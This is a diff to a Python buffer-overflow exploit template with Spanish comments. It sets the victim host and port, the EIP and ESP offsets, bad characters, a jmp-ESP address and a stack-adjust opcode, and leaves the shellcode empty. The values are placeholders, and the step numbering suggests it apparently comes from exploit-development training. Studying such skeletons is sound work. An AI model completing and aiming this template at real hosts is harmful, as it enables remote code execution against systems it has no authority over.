@@ -3,7 +3,7 @@
 rhost = ''
 
 # puerto máquina victima
-rport = 
+rport = 0
 
 # timeout conexión en segundos
 timeout = 10
@@ -17,10 +17,10 @@ pattern = b''
 offsetEIP = 0
 
 # offset ESP
-offsetESP = 0
+offsetESP = offsetEIP + 4
 
-# tamaño total del buffer a enviar
-buffer = 3000
+# tamaño máximo del relleno de padding final
+buffer = 2000
 
 # PASO IV
 badchars = [] # badchars = [0x00, 0x0a, 0x0d]
@@ -33,6 +33,7 @@ jmpESP = 0x11223344 # jmpESP = 0x11223344
 # PASO VI
 # subir ESP en la pila (stack)
 upESP = b'\x83\xec\x10'
+#upESP = b'\x90' * 16
 
 # shellcode
 shellcode =  b""
